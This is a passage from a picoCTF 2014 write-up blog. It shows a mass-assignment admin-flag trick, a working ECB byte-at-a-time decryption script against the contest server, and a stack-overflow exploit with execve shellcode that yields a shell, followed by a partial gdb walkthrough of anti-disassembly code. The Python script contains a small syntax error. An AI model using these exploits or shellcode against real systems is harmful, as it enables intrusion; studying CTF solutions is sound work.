</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_is_admin&quot;</span><span class="nt">&gt;</span>is_admin<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_password&quot;</span> <span class="na">name=</span><span class="s">&quot;user[is_admin]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By adding the <code>user[is_admin]</code> parameter, the register page thinks we are admin and gives us the flag:</p>

<p><img src="http://barrebas.github.io/assets/picoctf/daedelus.png" alt="" /></p>

<h1>Web Interception (140 points)</h1>

<p><code>We were able to get some code running in a Daedalus browser.
Unfortunately we can't quite get it to send us a cookie for its internal
login page ourselves... But we can make it make requests that we can see,
and it seems to be encrypting using ECB mode. See here for more details
about what we can get. It's running at vuln2014.picoctf.com:65414.
Can you get us the cookie?</code></p>

<p>Swappage and me solved this one. The program does the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># so, this is simulated. In reality we&#39;d have to run javascript on a target web browser</span>
</span><span class='line'>  <span class="c"># and capture the traffic. That&#39;s pretty hard to do in a way that scales, though, so we</span>
</span><span class='line'>  <span class="c"># simulate it instead.</span>
</span><span class='line'>  <span class="c"># This uses ECB mode.</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pkcs7_pad</span><span class="p">(</span><span class="s">&#39;GET /&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret_data</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>It takes user-supplied <em>hex-encoded</em> data and then returns an encrypted ciphertext in ECB mode. We need to find secret_data. The trick here is that ECB mode will return identical ciphertexts for identical plaintexts. Furthermore, it is a block-mode encryption. This means that we can create a block, have it encrypted, and check if it is present in the returned ciphertext. If so, our block must have matched part of the secret_data. In terms of blocks, we do the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span> <span class="n">GET</span> <span class="o">/</span><span class="n">aaaaaaaaaaa</span>                  <span class="p">]</span> <span class="c"># block one, padded to 16 bytes</span>
</span><span class='line'><span class="p">[</span> <span class="n">guess_byte</span> <span class="o">+</span> <span class="n">pkcs7_padding</span>        <span class="p">]</span> <span class="c"># block two, our guess</span>
</span><span class='line'><span class="p">[</span> <span class="n">bogus</span> <span class="nb">bytes</span> <span class="o">+</span> <span class="n">part</span> <span class="n">of</span> <span class="n">secret_data</span> <span class="p">]</span> <span class="c"># block three, part of secret_data</span>
</span><span class='line'><span class="p">[</span> <span class="o">...</span><span class="n">secret_data</span><span class="o">...</span>                 <span class="p">]</span> <span class="c"># block four, more secret_data</span>
</span><span class='line'><span class="p">[</span> <span class="n">one</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">secret_data</span> <span class="o">+</span> <span class="n">padding</span> <span class="p">]</span> <span class="c"># block five, we are interested in the ciphertext of this block!</span>
</span></code></pre></td></tr></table></div></figure>


<p>So if the ciphertext of our block two matches that of block five, we know that our guess was ok! We then prepend another byte to our guessed block. We add more padding to block three so that now, not one but <em>two</em> bytes of the secret_data are pushed onto block five. We repeat our guess for all possible characters and check the ciphertexts of block two and five. If they match, we have a bingo!</p>

<p>Long story short, here&rsquo;s the script to bruteforce secret_data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pkcs7_pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="n">needed</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="n">l</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span> <span class="o">*</span> <span class="n">needed</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">make_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">):</span>  
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="c"># pad string to next block</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="mi">11</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># insert guessed bytes, but first pad them</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">+=</span> <span class="n">guess</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">=</span> <span class="n">pkcs7_pad</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># add guessed bytes + padding</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">block</span>               
</span><span class='line'>
</span><span class='line'>  <span class="c"># push last bytes into a new ciphertext block. The +1 was empirically determined!</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>   
</span><span class='line'>  
</span><span class='line'>  <span class="k">return</span> <span class="n">payload</span>
</span><span class='line'>  
</span><span class='line'><span class="n">bruteforce</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="c"># think the length of the plaintext is 48 bytes (3 16-byte blocks)</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">48</span><span class="p">:</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># we&#39;ll brute-force the entire ascii range</span>
</span><span class='line'>  <span class="k">for</span> <span class="ow">in</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">127</span><span class="p">)</span>
</span><span class='line'>      <span class="n">z</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># display progress</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;[+] trying {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># connect to server</span>
</span><span class='line'>      <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">65414</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># banner</span>
</span><span class='line'>      <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># we bruteforce backwards, starting at the last byte</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">=</span> <span class="n">make_payload</span><span class="p">(</span><span class="n">z</span><span class="o">+</span><span class="n">bruteforce</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># send payload</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>      <span class="c"># split ciphertext into 32 bytes (which are 16 bytes hex-encoded).</span>
</span><span class='line'>      <span class="c"># we need to look for a duplicate block. if we find a duplicate,</span>
</span><span class='line'>      <span class="c"># it means our guessed bytes match the end of the string.</span>
</span><span class='line'>      <span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">32</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="mi">32</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># check if we have the same encoded block as the guess</span>
</span><span class='line'>      <span class="c"># the guessed block is the second returned block, due to the </span>
</span><span class='line'>      <span class="c"># way the payload is built up. </span>
</span><span class='line'>      <span class="k">if</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;match: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>          <span class="n">bruteforce</span> <span class="o">=</span> <span class="n">z</span> <span class="o">+</span> <span class="n">bruteforce</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[+] got {} so far&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>congrats_on_your_first_ecb_ecryption\r\n</code>.</p>

<h1>No Overflow (140 points)</h1>

<p>This program tries to prevent buffer overflows by first asking for the input length.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span>./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>10
</span><span class='line'>What is your name?
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>Hello, BBBBBBBBBBW
</span></code></pre></td></tr></table></div></figure>


<p>It disregards the rest of the ouput. However, the program uses <code>scanf</code>. If we supply <code>-1</code> as the length, we can bypass the overflow check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*300&#39;</span><span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...snip...
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>From here, it is easy to control EIP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*268+&quot;BBBB&quot;&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAA...snip...
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span>gdb no_overflow core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./no_overflow<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Quickly checking on the remote server if there is any protection on the binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>pico1139@shell:/home/no_overflow<span class="nv">$ </span>readelf -l no_overflow
</span><span class='line'>
</span><span class='line'>Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
</span><span class='line'>Entry point 0x8048430
</span><span class='line'>There are <span class="m">9</span> program headers, starting at offset 52
</span><span class='line'>
</span><span class='line'>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
</span><span class='line'>  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
</span><span class='line'>      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x0080c 0x0080c R E 0x1000
</span><span class='line'>  LOAD           0x000f08 0x08049f08 0x08049f08 0x0012c 0x00130 RW  0x1000
</span><span class='line'>  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
</span><span class='line'>  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
</span><span class='line'>  GNU_EH_FRAME   0x0006e0 0x080486e0 0x080486e0 0x0003c 0x0003c R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
</span><span class='line'>  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
</span></code></pre></td></tr></table></div></figure>


<p>The stack is executable! Furthermore, ASLR is not enabled. This makes it easy to stick in a <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shellcode</a> plus a NOP sled and return to an address on the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>pico1139@shell:/home/no_overflow<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*268+&quot;\xd0\xd6\xff\xff&quot;+&quot;\x90&quot;*200+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>11066<span class="o">(</span>pico1139<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>no_overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1017<span class="o">(</span>picogroup<span class="o">)</span>
</span><span class='line'>cat flag.txt
</span><span class='line'>what_is_your_sign
</span></code></pre></td></tr></table></div></figure>


<h1>Obfuscation (150 points)</h1>

<p>Tough one. There are some anti-disassembler tricks in here. Upon running the program, it asks for a password. Let&rsquo;s first try to get a breakpoint somewhere:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>b main
</span><span class='line'>Function <span class="s2">&quot;main&quot;</span> not defined.
</span><span class='line'>gdb-peda<span class="nv">$ </span>b __libc_start_main
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048400
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>...
</span><span class='line'>Breakpoint 1, 0xf7e2c970 in __libc_start_main <span class="o">()</span>
</span><span class='line'>   from /lib/i386-linux-gnu/i686/cmov/libc.so.6
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2x <span class="nv">$esp</span>
</span><span class='line'>0xffffd58c:   0x080484ed  0x08048420
</span></code></pre></td></tr></table></div></figure>


<p>Our entry-point is <code>0x08048420</code>. Set a breakpoint and continue tracing. We encounter an anti-disassembly trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x804843a:  jmp    0x804843b
</span><span class='line'> <span class="p">|</span> 0x804843c:  ror    BYTE PTR <span class="o">[</span>eax-0x39<span class="o">]</span>,0x44
</span><span class='line'> <span class="p">|</span> 0x8048440:  and    al,0x4
</span><span class='line'> <span class="p">|</span> 0x8048442:  push   esp
</span><span class='line'> <span class="p">|</span> 0x8048443:  lea    eax,<span class="o">[</span>eax+ecx*1<span class="o">]</span>
</span><span class='line'> <span class="p">|</span>-&gt;   0x804843b:   inc    eax
</span><span class='line'>       0x804843d: dec    eax
</span><span class='line'>       0x804843e: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048d54
</span><span class='line'>       0x8048446: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
</span></code></pre></td></tr></table></div></figure>


<p>It jumps one byte ahead, in the middle of the instruction, causing the disassembly of the next bytes to be incorrect. Luckily, this won&rsquo;t stop <code>gdb-peda</code>. Soon after, the program asks for a password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x804846a:  call   0x80483c0 &lt;getline@plt&gt;
</span><span class='line'>   0x804846f: <span class="nb">test   </span>eax,eax
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>0x0804846a in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x804846f
</span><span class='line'>Breakpoint <span class="m">2</span> at 0x804846f
</span></code></pre></td></tr></table></div></figure>


<p>I entered <code>012345678</code> and pressed enter. The program transfers control to the function at <code>0x8048580</code> which supposedly checks our password. Set a breakpoint and continue. The programs then takes a single byte from the password and does some checks:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x80485b6:    movzx  ebp,BYTE PTR <span class="o">[</span>ebx+edx*1<span class="o">]</span> <span class="c"># grab char</span>
</span><span class='line'>   0x80485ba: mov    eax,ebp
</span><span class='line'>   0x80485bc: movsx  ecx,al
</span><span class='line'>   0x80485bf: add    ecx,0x40
</span><span class='line'>   0x80485c2: mov    edi,ecx
</span><span class='line'>   0x80485c4: sar    edi,0x1f                 <span class="c"># no idea what this </span>
</span><span class='line'>   0x80485c7: shr    edi,0x19                 <span class="c"># is supposed to do.</span>
</span><span class='line'>   0x80485ca: add    ecx,edi
</span><span class='line'>   0x80485cc: and    ecx,0x7f                 <span class="c"># check for ASCII?</span>
</span><span class='line'>   0x80485cf: sub    ecx,edi
</span><span class='line'>   0x80485d1: mov    BYTE PTR <span class="o">[</span>esp+ecx*1+0xc<span class="o">]</span>,0x1
</span><span class='line'>   0x80485d6: lea    ecx,<span class="o">[</span>ebp-0xa<span class="o">]</span>            <span class="c"># subtract 0xa from char</span>
</span><span class='line'>   0x80485d9: cmp    cl,0x70                  <span class="c"># check for below &#39;z&#39;</span>
</span><span class='line'>   0x80485dc: jbe    0x8048600
</span></code></pre></td></tr></table></div></figure>


<p>And then jumps to <code>0x8048600</code>. This piece is interesting, because it uses a jump-table (like in a switch statement). Depending on the value of (char - 0xa), it jumps to a code region:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x8048600:  movzx  ecx,cl
</span><span class='line'>   0x8048603: jmp    DWORD PTR <span class="o">[</span>ecx*4+0x8048b90<span class="o">]</span>
</span><span class='line'>
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/400x 0x8048b90
</span><span class='line'>0x8048b90:    0x08048610  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ba0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bb0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bc0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bd0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048be0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048bf0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c00:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c10:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c20:    0x080485de  0x080485de  0x08048628  0x08048640
</span><span class='line'>0x8048c30:    0x08048658  0x08048678  0x08048698  0x080486c0
</span><span class='line'>0x8048c40:    0x080486e0  0x08048708  0x08048730  0x08048758
</span><span class='line'>0x8048c50:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c60:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c70:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c80:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048c90:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048ca0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cb0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cc0:    0x080485de  0x080485de  0x080485de  0x080485de
</span><span class='line'>0x8048cd0:    0x080485de  0x080485de  0x080485de  0x080485de
